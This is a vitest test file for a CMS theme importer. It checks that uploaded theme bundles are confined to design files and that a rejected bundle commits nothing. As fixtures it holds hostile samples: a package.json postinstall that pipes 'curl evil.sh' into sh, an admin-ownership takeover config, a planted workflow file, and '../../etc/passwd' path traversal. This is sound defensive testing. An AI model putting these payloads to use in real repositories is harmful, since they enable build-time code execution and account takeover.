// A theme bundle is the one input the CMS explicitly treats as UNTRUSTED: an
// upload from a third party that gets committed straight into the tenant's repo.
// These cases go through the real parseTheme → applyTheme path and assert refusal
// **and** that nothing was committed — a rejection that still writes is not a
// rejection.
import { describe, it, expect } from "vitest";
import { parseTheme, applyTheme } from "./theme";
import type { GitHubClient } from "./github";

// ── a real .tar.gz, built in the test ────────────────────────────────────────
// Only the fields backend/theme.ts's reader looks at are filled (name, size,
// typeflag, prefix); it verifies no checksum, so neither do we.
const ENC = new TextEncoder();

function tarHeader(name: string, size: number): Uint8Array {
  const h = new Uint8Array(512);
  h.set(ENC.encode(name.slice(0, 100)), 0);
  h.set(ENC.encode("0000644\0"), 100); // mode
  h.set(ENC.encode(size.toString(8).padStart(11, "0") + "\0"), 124);
  h[156] = 0x30; // typeflag "0" — regular file
  h.set(ENC.encode("ustar\0" + "00"), 257);
  return h;
}

function tar(files: { name: string; body: string }[]): Uint8Array {
  const blocks: Uint8Array[] = [];
  for (const f of files) {
    const body = ENC.encode(f.body);
    blocks.push(tarHeader(f.name, body.length));
    const padded = new Uint8Array(Math.ceil(body.length / 512) * 512);
    padded.set(body);
    blocks.push(padded);
  }
  blocks.push(new Uint8Array(1024)); // two zero blocks = end of archive
  const total = blocks.reduce((n, b) => n + b.length, 0);
  const out = new Uint8Array(total);
  let off = 0;
  for (const b of blocks) {
    out.set(b, off);
    off += b.length;
  }
  return out;
}

async function bundle(payload: { name: string; body: string }[]): Promise<File> {
  const entries = [
    { name: "theme.json", body: JSON.stringify({ name: "evil", title: "Evil" }) },
    ...payload,
  ];
  const gz = new Blob([tar(entries) as BlobPart])
    .stream()
    .pipeThrough(new CompressionStream("gzip"));
  return new File([await new Response(gz).arrayBuffer()], "theme.tar.gz");
}

/** A client that records commits instead of making them, so "nothing was written" is checkable. */
function spyClient() {
  const commits: { path: string }[][] = [];
  const client = {
    commitFiles: async (files: { path: string }[]) => {
      commits.push(files);
      return "deadbeef";
    },
  } as unknown as GitHubClient;
  return { client, commits };
}

/** Parse + apply, the way ThemeImport does. Returns the paths that reached GitHub. */
async function applyBundle(payload: { name: string; body: string }[]): Promise<string[]> {
  const { client, commits } = spyClient();
  const theme = await parseTheme(await bundle(payload));
  await applyTheme(client, theme);
  return commits.flat().map((f) => f.path);
}

describe("theme bundles are confined to the design file set", () => {
  it("applies an ordinary design bundle", async () => {
    const written = await applyBundle([
      { name: "files/frontend/styles/site.css", body: "body{}" },
      { name: "files/frontend/components/Card.astro", body: "<div/>" },
      { name: "files/data/appearance.json", body: "{}" },
    ]);
    expect(written).toEqual([
      "frontend/styles/site.css",
      "frontend/components/Card.astro",
      "data/appearance.json",
    ]);
  });

  it("still round-trips an exported site dump (content + media)", async () => {
    // backend/export.ts can put these in a bundle on request, so the allow-list has
    // to accept them back or the export→import loop breaks.
    const written = await applyBundle([
      { name: "files/frontend/styles/site.css", body: "body{}" },
      { name: "files/content/posts/en/hello.md", body: "# hi" },
      { name: "files/public/images/uploads/photo.jpg", body: "jpeg" },
    ]);
    expect(written).toContain("content/posts/en/hello.md");
    expect(written).toContain("public/images/uploads/photo.jpg");
  });

  // Each of these was writable under the old deny-list.
  const forbidden: [string, string][] = [
    // A `postinstall`, or repointing the lanza-site dependency at an arbitrary
    // tarball. The Pages build command IS this file's `build` script.
    ["package.json", '{"scripts":{"postinstall":"curl evil.sh|sh"}}'],
    // Imported by the build → build-time code execution.
    ["astro.config.mjs", "process.exit(0)"],
    // Decides who owns /admin. A persistent AUTHORIZATION change: the CMS, the
    // GitHub proxy and the Cloudflare token, handed over on the next deploy.
    ["lanza.config.json", '{"adminLogin":"attacker"}'],
    // Not design, and nothing else validates it on the way in.
    ["data/redirects.json", '{"redirects":[]}'],
    ["README.md", "# hi"],
    // Already blocked before, and must stay blocked.
    [".github/workflows/pwn.yml", "on: push"],
    ["functions/admin/_middleware.ts", "export const onRequest = () => {}"],
    ["bot/wrangler.jsonc", "{}"],
  ];

  for (const [path, body] of forbidden) {
    it(`refuses to write ${path}, and commits nothing`, async () => {
      const { client, commits } = spyClient();
      const file = await bundle([
        { name: "files/frontend/styles/site.css", body: "body{}" }, // a valid file alongside
        { name: `files/${path}`, body },
      ]);
      await expect(parseTheme(file)).rejects.toThrow(path);
      // The whole bundle is refused, not just the bad entry — the legitimate CSS
      // must not land either, or a hostile theme gets a partial apply.
      expect(commits).toEqual([]);
      expect(client).toBeDefined();
    });
  }

  it("refuses a path that escapes the repo", async () => {
    const { commits } = spyClient();
    const file = await bundle([{ name: "files/../../../../etc/passwd", body: "x" }]);
    await expect(parseTheme(file)).rejects.toThrow(/escapes the repo/);
    expect(commits).toEqual([]);
  });

  it("refuses an absolute or backslash path", async () => {
    await expect(parseTheme(await bundle([{ name: "files//etc/passwd", body: "x" }]))).rejects.toThrow(
      /illegal file path/,
    );
    await expect(
      parseTheme(await bundle([{ name: "files/frontend\\styles\\x.css", body: "x" }])),
    ).rejects.toThrow(/illegal file path/);
  });

  it("still accepts data/schema.json — a theme may ship a content model", async () => {
    // Deliberate: shipping the model is why the exporter packs it. What makes it
    // safe is scripts/gen-content-config.mjs, which validates every value that
    // reaches a code position instead of trusting the file.
    const written = await applyBundle([{ name: "files/data/schema.json", body: "[]" }]);
    expect(written).toEqual(["data/schema.json"]);
  });
});
